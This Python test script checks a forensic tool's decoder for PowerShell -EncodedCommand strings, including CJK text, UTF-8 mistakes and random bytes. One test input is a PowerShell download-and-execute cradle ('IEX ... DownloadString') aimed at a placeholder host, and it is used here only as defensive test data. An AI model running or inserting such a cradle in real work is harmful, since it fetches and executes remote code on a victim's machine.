"""-EncodedCommand: decode real Unicode commands, flag what PowerShell could not run.

Codex release audit C6: the plain-text check (90% of characters below U+2000)
labelled a valid UTF-16LE command containing CJK text "not decodable".  The
check existed for a real trap -- base64 of UTF-8 text read as UTF-16LE gives
printable CJK too -- so the two must be told apart by the bytes, not by script.
Synthetic commands only.
"""
import base64
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

CHECKS = []


def check(name, cond, detail=""):
    CHECKS.append((name, bool(cond), detail))
    print(f"  {'PASS' if cond else 'FAIL'}  {name}" + (f"  -- {detail}" if detail else ""), flush=True)


def main() -> int:
    from evtx_tool.analysis.ps_extractor.event_parsers import _extract_encoded_command as dec

    def enc16(t):
        return base64.b64encode(t.encode("utf-16-le")).decode()

    cjk = 'Write-Output "你好世界 日本語のテキスト"'
    pure_cjk = "你好世界日本語のテキストです"
    ascii_cmd = "IEX (New-Object Net.WebClient).DownloadString('http://x/a')"
    check("a UTF-16LE command with CJK text is decoded exactly", dec(f"powershell -enc {enc16(cjk)}") == cjk,
          dec(f"powershell -enc {enc16(cjk)}")[:60])
    check("a command that is entirely CJK is decoded exactly",
          dec(f"powershell -enc {enc16(pure_cjk)}") == pure_cjk, dec(f"powershell -enc {enc16(pure_cjk)}")[:60])
    check("an ASCII command is decoded exactly", dec(f"powershell -e {enc16(ascii_cmd)}") == ascii_cmd)
    utf8 = base64.b64encode(b"Get-Process | Select-Object Name, Id").decode()
    r = dec(f"powershell -enc {utf8}")
    check("base64 of UTF-8 text is flagged as not UTF-16LE and shown as UTF-8",
          r.startswith("[not UTF-16LE") and "Get-Process | Select-Object Name, Id" in r, r[:120])
    junk = base64.b64encode(bytes(range(0, 256, 3))).decode()
    r = dec(f"powershell -enc {junk}")
    check("random bytes are not decodable", r.startswith("[not decodable"), r[:80])

    ok = sum(1 for _n, c, _d in CHECKS if c)
    print(f"\n{'=' * 62}\n{ok}/{len(CHECKS)} checks passed")
    for n_, c, d in CHECKS:
        if not c:
            print(f"  FAILED: {n_}  {d}")
    return 0 if ok == len(CHECKS) else 1


if __name__ == "__main__":
    sys.exit(main())
